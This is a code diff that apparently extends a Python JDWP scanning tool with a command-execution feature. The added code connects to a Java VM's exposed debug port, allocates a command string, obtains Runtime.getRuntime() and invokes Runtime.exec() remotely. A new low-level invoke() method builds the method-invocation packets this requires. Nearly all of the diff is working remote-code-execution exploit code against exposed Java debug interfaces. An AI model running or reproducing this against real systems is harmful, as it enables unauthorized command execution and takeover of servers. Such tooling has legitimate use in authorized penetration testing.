@@ -121,17 +121,17 @@ def jdwpscan_worker(target, actions, timeout):
 
             runtime_exec(jdwp, "system_info", actions['system_info']['break_on'])
 
+        if 'exec' in actions:
+            jdwp.all_classes()
 
-
-                
-
+            runtime_exec(jdwp, "command", actions['exec']['break_on'], command=actions['exec']['command'])
 
 
     except Exception as e:
         raise e
 
 
-def runtime_exec(jdwp, action, break_on):
+def runtime_exec(jdwp, action, break_on, command=None):
     # 1. get Runtime class reference
     runtimeClass = jdwp.get_class_by_name(b"Ljava/lang/Runtime;")
     if runtimeClass is None:
@@ -262,6 +262,51 @@ def runtime_exec(jdwp, action, break_on):
                 output += " "*30 + " - %s: %s\n" % (propDesc.ljust(60), res.decode())
                 #print ("[+] Found %s '%s'" % (propDesc, res))
         Output.success({"target": jdwp.url(), "message": output})
+        return True
+
+    elif action == "command":
+        runtimeClassId = runtimeClass["refTypeId"]
+        getRuntimeMethId = getRuntimeMeth["methodId"]
+
+        # 1. allocating string containing our command to exec()
+        cmdObjIds = jdwp.createstring( command.encode() )
+        if len(cmdObjIds) == 0:
+            Output.error({"target": jdwp.url(), "message": "[-] Failed to allocate command"})
+            return False
+        cmdObjId = cmdObjIds[0]["objId"]
+        #print ("[+] Command string object created id:%x" % cmdObjId)
+
+        # 2. use context to get Runtime object
+        buf = jdwp.invokestatic(runtimeClassId, threadId, getRuntimeMethId)
+        if buf[0] != TAG_OBJECT:
+            Output.error({"target": jdwp.url(), "message": "[-] Unexpected returned type: expecting Object"})
+            return False
+        rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
+
+        if rt is None:
+            Output.error({"target": jdwp.url(), "message": "[-] Failed to invoke Runtime.getRuntime()"})
+            return False
+        #print ("[+] Runtime.getRuntime() returned context id:%#x" % rt)
+
+        # 3. find exec() method
+        execMeth = jdwp.get_method_by_name(b"exec")
+        if execMeth is None:
+            Output.error({"target": jdwp.url(), "message": "[-] Cannot find method Runtime.exec()"})
+            return False
+        #print ("[+] found Runtime.exec(): id=%x" % execMeth["methodId"])
+
+        # 4. call exec() in this context with the alloc-ed string
+        data = [ bytes([TAG_OBJECT]) + jdwp.format(jdwp.objectIDSize, cmdObjId) ]
+        buf = jdwp.invoke(rt, threadId, runtimeClassId, execMeth["methodId"], *data)
+        if buf[0] != TAG_OBJECT:
+            Output.error({"target": jdwp.url(), "message": "[-] Unexpected returned type: expecting Object"})
+            return False
+
+        retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
+        #print ("[+] Runtime.exec() successful, retId=%x" % retId)
+        Output.success({"target": jdwp.url(), "message": "[+] Runtime.exec() successful, retId=%x" % retId})
+        return True
+
 
 
 
@@ -530,6 +575,20 @@ class JDWP:
                 buf += data
             else:
                 time.sleep(1)
+        return buf
+
+    def invoke(self, objId, threadId, classId, methId, *args):
+        data = self.format(self.objectIDSize, objId)
+        data+= self.format(self.objectIDSize, threadId)
+        data+= self.format(self.referenceTypeIDSize, classId)
+        data+= self.format(self.methodIDSize, methId)
+        data+= struct.pack(">I", len(args))
+        for arg in args:
+            data+= arg
+        data+= struct.pack(">I", 0)
+
+        self.socket.sendall( self.create_packet(INVOKEMETHOD_SIG, data=data) )
+        buf = self.read_reply()
         return buf
 
     def parse_event_breakpoint(self, buf, eventId):
